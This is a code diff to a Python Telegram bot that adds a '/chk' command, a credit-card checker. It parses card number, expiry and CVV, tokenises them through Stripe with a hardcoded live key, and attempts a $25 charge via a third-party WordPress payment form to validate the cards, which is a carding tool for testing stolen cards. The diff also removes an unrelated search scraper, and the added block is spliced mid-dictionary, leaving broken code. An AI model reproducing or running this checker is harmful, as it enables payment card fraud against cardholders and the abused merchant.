@@ -347,6 +347,89 @@ async def ch(message: types.Message):
             "fullstripe_email": Email,
             "fullstripe_custom_amount": "25.0",
             "fullstripe_amount_index": 0,
+@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
+async def ch(message: types.Message):
+    await message.answer_chat_action('typing')
+    tic = time.perf_counter()
+    ID = message.from_user.id
+    FIRST = message.from_user.first_name
+    try:
+        await dp.throttle('chk', rate=ANTISPAM)
+    except Throttled:
+        await message.reply('<b>Too many requests!</b>\n'
+                            f'Blocked For {ANTISPAM} seconds')
+    else:
+        if message.reply_to_message:
+            cc = message.reply_to_message.text
+        else:
+            cc = message.text[len('/chk '):]
+
+        if len(cc) == 0:
+            return await message.reply("<b>No Card to chk</b>")
+
+        x = re.findall(r'\d+', cc)
+        ccn = x[0]
+        mm = x[1]
+        yy = x[2]
+        cvv = x[3]
+        if mm.startswith('2'):
+            mm, yy = yy, mm
+        if len(mm) >= 3:
+            mm, yy, cvv = yy, cvv, mm
+        if len(ccn) < 15 or len(ccn) > 16:
+            return await message.reply('<b>Failed to parse Card</b>\n'
+                                       '<b>Reason: Invalid Format!</b>')   
+        BIN = ccn[:6]
+        if BIN in BLACKLISTED:
+            return await message.reply('<b>BLACKLISTED BIN</b>')
+        # get guid muid sid
+        headers = {
+            "user-agent": UA,
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/x-www-form-urlencoded"
+        }
+
+        # b = session.get('https://ip.seeip.org/', proxies=proxies).text
+
+        s = session.post('https://m.stripe.com/6', headers=headers)
+        r = s.json()
+        Guid = r['guid']
+        Muid = r['muid']
+        Sid = r['sid']
+
+        postdata = {
+            "guid": Guid,
+            "muid": Muid,
+            "sid": Sid,
+            "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
+            "card[name]": Name,
+            "card[number]": ccn,
+            "card[exp_month]": mm,
+            "card[exp_year]": yy,
+            "card[cvc]": cvv
+        }
+
+        HEADER = {
+            "accept": "application/json",
+            "content-type": "application/x-www-form-urlencoded",
+            "user-agent": UA,
+            "origin": "https://js.stripe.com",
+            "referer": "https://js.stripe.com/",
+            "accept-language": "en-US,en;q=0.9"
+        }
+
+        pr = session.post('https://api.stripe.com/v1/tokens',
+                          data=postdata, headers=HEADER)
+        Id = pr.json()['id']
+
+        # hmm
+        load = {
+            "action": "wp_full_stripe_payment_charge",
+            "formName": "BanquetPayment",
+            "fullstripe_name": Name,
+            "fullstripe_email": Email,
+            "fullstripe_custom_amount": "25.0",
+            "fullstripe_amount_index": 0,
             "stripeToken": Id
         }
 
@@ -403,26 +486,6 @@ async def ch(message: types.Message):
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {await is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
-
-# ... (código principal)
-
-@dp.message_handler(commands=['search'], commands_prefix=PREFIX)
-async def search_web_and_send_result(message: types.Message):
-    await message.answer_chat_action('typing')
-    
-    query = message.text[len('/search '):]
-    # Envía el dato a la página web para buscar el resultado
-    response = requests.get(f'https://example.com/search?query={query}')
-    
-    if response.status_code == 200:
-        soup = bs(response.text, 'html.parser')
-        # Aquí selecciona los elementos que deseas extraer usando métodos de BeautifulSoup
-        result = soup.find('div', {'class': 'result'}).text
-        
-        # Envía el resultado al bot de Telegram
-        await message.reply(result)
-    else:
-        await message.reply('No se pudo obtener el resultado.')
 
 
 if __name__ == '__main__':
